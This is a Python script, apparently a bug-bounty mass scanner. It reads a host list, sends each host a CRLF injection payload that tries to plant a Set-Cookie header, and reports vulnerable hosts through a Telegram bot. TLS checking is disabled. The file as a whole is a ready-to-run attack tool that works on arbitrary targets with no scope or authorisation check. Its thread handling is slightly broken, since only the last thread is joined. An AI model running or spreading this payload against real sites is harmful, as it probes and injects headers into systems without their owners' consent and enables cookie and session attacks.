import requests
import uuid
import subprocess
import os
import sys
import binascii
import json
from urllib3.exceptions import InsecureRequestWarning
from threading import Thread, Lock
from multiprocessing import Process, cpu_count
import telegram
from urllib.parse import urlparse
import glob
import time 
import ast 
#token that can be generated talking with @BotFather on telegram
api_token = ''
chat_id = ''

PROCESS = cpu_count() * 2

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
THREADS = 4
lock = Lock()
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


false_positives = ['handl_landing_page','handl_url',
'handl_url','REQUEST','uri','URI','landingpage','Set-Cookie:']





vuln_cookies_found = []


def get_ips(dataset_path):
    ips = []

    file = open(dataset_path, "r")
    dataset = list(filter(None, file.read().split("\n")))

    for line in dataset:
        # line = json.loads(line)
        # ips.append(line['IP'])
       
        ips.append(line.rstrip())

    return ips
    
    
    
def ip_to_process(a, n):
    # ode to devil the best coder i know ;)
    k, m = divmod(len(a), n)
    for i in range(n):
        yield a[i * k + min(i, m):(i + 1) * k + min(i + 1, m)]
       
       
        
def crlf_injection_tester(hosts_in):
    for hosts in hosts_in:
        domain = urlparse(hosts).netloc
        cookie_scope = domain
        cookie_rand = "h1(tokenhere)"#binascii.hexlify(os.urandom(16))
        session = requests.Session()
        url_pay = hosts+"/%0d%0aSet-Cookie:{}:{};domain={}".format(str(cookie_rand),str(cookie_rand),str(domain))
        test_url = url_pay
        try:
           response = session.get(test_url,timeout=3,verify=False)
           if session.cookies:
              tested_info = {}
              tested_info['target_url'] = test_url
              tested_info['cookie_set'] = cookie_rand
              tested_info['cookies_returned'] = session.cookies.get_dict()
              tested_info['is_vuln'] = False
              
              cookies = session.cookies.get_dict()
              
              for key in cookies.items():
                  for cook in key:
            
                      if cookie_rand in cook:
                         
                         #todo check for false positive by looking for reflection in location type headrers 
                         print("CRLF Injection Possibly Detected")
                         tested_info['is_vuln'] = True
                         vuln_cookies_found.append(json.dumps(tested_info))
                         print(json.dumps(tested_info))
                         try:
                            send_notification(tested_info,chat_id)
                         except Exception as ex1:
                            print(ex1)
                            pass
                      else:
                        print(json.dumps(tested_info))
                        pass
                  
        except Exception as issues:
           #print(issues)
           pass      
 
def send_notification(msg, chat_id, token=api_token):
    """
    Send a mensage to a telegram user specified on chatId
    chat_id must be a number!
    """
    try:
       bot = telegram.Bot(token=token)
       bot.sendMessage(chat_id=chat_id, text=msg)
    except Exception as ex:
      print(ex)
      pass
	
	
	

if __name__ == "__main__":

    
   ip_list = get_ips(sys.argv[1])
   ips = ip_to_process(ip_list, PROCESS)
    
   for _ in range(PROCESS):
       p = Thread(target=crlf_injection_tester, args=(next(ips),))
       p.daemon = True
       p.start()

   for _ in range(PROCESS):
       p.join()
    
        

   for result in vuln_cookies_found:
       print(result)
